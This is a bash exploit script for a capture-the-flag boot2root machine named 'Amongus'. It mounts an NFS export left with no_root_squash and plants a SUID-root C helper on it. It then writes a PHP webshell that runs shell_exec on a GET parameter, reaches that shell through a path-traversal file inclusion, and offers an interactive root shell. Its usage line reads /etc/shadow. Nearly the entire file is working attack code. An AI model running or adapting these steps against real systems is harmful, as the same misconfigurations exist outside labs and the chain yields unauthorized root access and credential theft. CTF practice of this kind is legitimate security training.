#!/bin/bash
# root_final.sh - land a ROOT shell on the Amongus target (The Skeld)
#
# Challenge : Amongus (Linux Privilege Escalation / Boot2Root)
# Author    : Priyank Rastogi
#
# Chain:
#   1. NFS export with no_root_squash  -> <TARGET>:/home/imposter/communication
#   2. Compile a static SUID-root helper on the share and chown root:root it
#      (honoured because the export is not root-squashed)
#   3. LFI -> RCE on the meeting vhost: include($_GET['vote'] . $ext)
#      the share path contains "imposter", satisfying the app's check
#   4. The webshell runs the SUID helper => uid=0
#
# Usage:
#   ./root_final.sh                          # interactive root shell
#   ./root_final.sh 'id; cat /etc/shadow'    # one-off root command
#
# Requires: gcc, curl, base64, nfs-common, sudo.
set -euo pipefail

# ---------------------------------------------------------------------------
# CONFIGURE THESE FOR YOUR ENVIRONMENT
TARGET=192.168.1.35
NFS_EXPORT="${TARGET}:/home/imposter/communication"
NFS_MNT=/mnt/nfs                            # local mountpoint for the export
SHARE=/home/imposter/communication          # path of the share ON THE TARGET
HELPER=rc                                   # SUID-root wrapper name on the share
HOST_HDR="Host: meeting.amongus.ctf"
VOTE_PATH="imposter/../../../../home/imposter/communication/sh"
# ---------------------------------------------------------------------------

log(){ echo -e "[*] $*" >&2; }
die(){ echo -e "[!] $*" >&2; exit 1; }

command -v gcc     >/dev/null || die "gcc not found (needed to build the SUID helper)"
command -v curl    >/dev/null || die "curl not found"
command -v base64  >/dev/null || die "base64 not found"

# --- 0. mount the NFS export ---
if ! mountpoint -q "$NFS_MNT"; then
  log "mounting NFS $NFS_EXPORT at $NFS_MNT ..."
  sudo mkdir -p "$NFS_MNT"
  sudo mount -t nfs -o vers=3 "$NFS_EXPORT" "$NFS_MNT" || die "NFS mount failed"
fi

# --- 1. build (or reuse) the SUID-root helper on the share ---
if [ -x "$NFS_MNT/$HELPER" ] && [ "$(stat -c '%u:%a' "$NFS_MNT/$HELPER" 2>/dev/null)" = "0:4755" ]; then
  log "reusing helper: $(ls -l "$NFS_MNT/$HELPER")"
else
  log "building SUID-root helper ($HELPER) ..."
  cat > /tmp/rhelper.c <<'EOF'
#include <unistd.h>
#include <stdio.h>
int main(int argc, char **argv){
    setuid(0); setgid(0);
    if (argc > 1) { execvp(argv[1], &argv[1]); perror("execvp"); return 127; }
    execl("/bin/bash","bash","-i",NULL);
    perror("execl"); return 127;
}
EOF
  gcc -static -O2 -o "$NFS_MNT/$HELPER" /tmp/rhelper.c
  sudo chown root:root "$NFS_MNT/$HELPER"
  sudo chmod 4755    "$NFS_MNT/$HELPER"
  log "helper installed: $(ls -l "$NFS_MNT/$HELPER")"
fi

# --- 2. webshell: base64-encodes output so nothing gets HTML-mangled ---
cat > "$NFS_MNT/sh.php" <<'EOF'
<?php
$cmd = $_GET['c'];
echo base64_encode(shell_exec($cmd . " 2>&1"));
EOF

# --- 3. run a command as root through LFI -> webshell -> SUID helper ---
rootcmd(){
  local b64
  b64=$(curl -s -H "$HOST_HDR" --get \
      --data-urlencode "vote=$VOTE_PATH" \
      --data-urlencode "ext=.php" \
      --data-urlencode "c=$SHARE/$HELPER /bin/bash -c \"$1\"" \
      "http://$TARGET/" \
    | sed -n '/<div class="load">/,/<\/div>/p' | sed '1d;$d' | tr -d '[:space:]')
  printf '%s' "$b64" | base64 -d 2>/dev/null || printf '%s\n' "$b64"
}

# --- 4. dispatch ---
if [ $# -gt 0 ]; then
  log "run as root: $*"
  rootcmd "$*"
  exit 0
fi

log "interactive ROOT shell on $TARGET ('exit' to quit)"
while :; do
  printf 'root@amongus# '
  read -r line || break
  case "$line" in
    "" ) continue ;;
    "exit"|"quit" ) break ;;
  esac
  rootcmd "$line"
done